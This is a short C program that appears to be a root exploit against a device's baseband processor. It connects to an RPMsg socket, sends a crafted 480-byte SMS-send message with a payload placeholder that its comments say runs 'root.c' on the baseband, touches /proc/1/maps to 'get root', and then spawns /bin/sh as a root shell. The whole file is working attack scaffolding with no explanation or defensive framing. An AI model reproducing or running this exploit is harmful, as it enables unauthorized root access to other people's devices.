#include <stdio.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

struct sockaddr_rpmsg {
    uint16_t family;
    uint16_t unknown;
    uint32_t vproc_id;
    uint32_t addr;
} __attribute__ ((packed));

void sendall(int sock, const void* buf, size_t len) {
    if (send(sock, buf, len, 0) < 0) {
        puts("sendall fail");
        exit(1);
    }
}

void recvall(int sock, void* buf, size_t len) {
    if (recv(sock, buf, len, 0) < 0) {
        puts("recvall fail");
        exit(1);
    }
}

struct sms_send_t {
    uint32_t id;
    uint32_t dest;
    char msg[512 - 8]; //0xb4
};

int main() {
    int sock = socket(41, 5, 0); 
    if (sock < 0) {
        puts("socket fail");
        return 1;
    }
    struct sockaddr_rpmsg dstaddr;
    memset(&dstaddr, 0, sizeof(dstaddr));
    dstaddr.family = 0x29;
    dstaddr.addr = 0x65;
    dstaddr.vproc_id = 0;
    if (connect(sock, &dstaddr, sizeof(dstaddr)) < 0) {
        puts("connect fail");
        return 1;
    }

    //execute root.c on baseband processor
    struct sms_send_t msg2 = {2, 0x42424242,{
        __PAYLOAD__
    }};
    sendall(sock, &msg2, 480);

    //get root
    int fd = open("/proc/1/maps", 0, 0);
    char c;
    read(fd, &c, 1);

    //root shell
    char *a[] = {"/bin/sh", NULL};
    execve(*a, a, NULL);
    return 0;
}
